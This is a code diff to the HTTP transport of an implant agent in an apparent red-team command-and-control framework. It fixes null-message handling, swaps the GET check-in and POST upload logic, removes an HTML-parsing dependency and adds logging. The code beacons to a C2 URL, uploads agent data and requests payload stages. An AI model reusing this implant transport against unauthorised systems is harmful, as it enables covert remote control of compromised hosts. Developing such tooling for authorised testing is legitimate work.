@@ -5,7 +5,7 @@ using System.Net;
 using System.Net.Security;
 using System.Text;
 using Faction.Modules.Dotnet.Common;
-using HtmlAgilityPack;
+// using HtmlAgilityPack;
 using Newtonsoft.Json;
 
 namespace Faction.Modules.Dotnet.Common
@@ -162,6 +162,12 @@ namespace Faction.Modules.Dotnet.Common
                 // Create a new WebClient object and load the Headers/Cookies per the Client Profile
                 WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");
 
+                // If Message is null we need to ensure that its an empty string
+                if (String.IsNullOrEmpty(Message))
+                {
+                    Message = "";
+                }
+
                 // Add the Beacon Message into the request per the configuration
                 var _messageLocation = _config.HttpGet["ClientPayload"]["Message"];
                 if (_messageLocation.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Header")
@@ -205,6 +211,12 @@ namespace Faction.Modules.Dotnet.Common
 
                 // Create a new WebClient object and load the Headers/Cookies per the Client Profile
                 WebClient _webClient = CreateWebClient(_ignoreSSL, "HttpGet");
+                
+                // If Message is null we need to ensure that its an empty string
+                if (String.IsNullOrEmpty(Message))
+                {
+                    Message = "";
+                }
 
                 // Add the Beacon Message into the request per the configuration
                 var _messageLocation = _config.HttpPost["ClientPayload"]["Message"];
@@ -236,8 +248,7 @@ namespace Faction.Modules.Dotnet.Common
                 string jsonMessage = JsonConvert.SerializeObject(_bodyContent);
 
                 _webClient.Headers.Add(HttpRequestHeader.ContentType, "application/json");
-                _webClient.Headers.Add(HttpRequestHeader.ContentLength, jsonMessage.Length.ToString());
-
+                
                 Console.WriteLine($"[Marauder Http Transport] Sending POST. URL: {beaconUrl} Message: {jsonMessage}");
 
                 string content = _webClient.UploadString(beaconUrl, jsonMessage);
@@ -277,11 +288,13 @@ namespace Faction.Modules.Dotnet.Common
 
                     if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                     {
-                        _propKey = property.Key;
-                        HtmlDocument pageDocument = new HtmlDocument();
-                        pageDocument.LoadHtml(pageContent);
-                        _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
-                        _message.Add(_propKey, _propValue);
+                        // Removing HtmlAgilityPack dependency
+
+                        // _propKey = property.Key;
+                        // HtmlDocument pageDocument = new HtmlDocument();
+                        // pageDocument.LoadHtml(pageContent);
+                        // _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
+                        // _message.Add(_propKey, _propValue);
                     }
                 }
             }
@@ -303,11 +316,13 @@ namespace Faction.Modules.Dotnet.Common
 
                     if (property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[0] == "Body")
                     {
-                        _propKey = property.Key;
-                        HtmlDocument pageDocument = new HtmlDocument();
-                        pageDocument.LoadHtml(pageContent);
-                        _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
-                        _message.Add(_propKey, _propValue);
+                        // Removing HtmlAgilityPack dependency
+
+                        // _propKey = property.Key;
+                        // HtmlDocument pageDocument = new HtmlDocument();
+                        // pageDocument.LoadHtml(pageContent);
+                        // _propValue = pageDocument.GetElementbyId(property.Value.Split(new string[] {"::"}, StringSplitOptions.RemoveEmptyEntries)[1].Trim(new Char[] { '%' })).InnerText;
+                        // _message.Add(_propKey, _propValue);
                     }
                 }
             }
@@ -317,7 +332,7 @@ namespace Faction.Modules.Dotnet.Common
 
         public override string Stage(string StageName, string StagingId, string Message)
         {
-
+            Console.WriteLine($"[Marauder Http Transport] Sending Stage Request. Name: {StageName}, Id: {StagingId}, Message: {Message}");
             Dictionary<string, string> responseDict = new Dictionary<string, string>();
             responseDict = DoStagePost(StageName, StagingId, Message);
 
@@ -326,21 +341,20 @@ namespace Faction.Modules.Dotnet.Common
 
         public override string Beacon(string AgentName, string Message)
         {
-
             Dictionary<string, string> responseDict = new Dictionary<string, string>();
 
-            // If there is no Message data, do a post request
-            if (!String.IsNullOrEmpty(Message))
-            {
-                Console.WriteLine($"[Marauder Http Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
-                responseDict = DoPostRequest(AgentName, Message);
-            }
-            
-            // If we have data to return, do a simple Http Get (Check-in) for any new content
-            else
+            // If there is no Message data, do a Get request (Check-in)
+            if (String.IsNullOrEmpty(Message))
             {
                 Console.WriteLine($"[Marauder Http Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
                 responseDict = DoGetRequest(AgentName, Message);
+            }
+            
+            // If we have data to return, do a Http Post
+            else
+            {
+                Console.WriteLine($"[Marauder Http Transport] Sending Beacon: AgentName: {AgentName} Message: {Message}");
+                responseDict = DoPostRequest(AgentName, Message);
             }
 
             return responseDict["Message"];
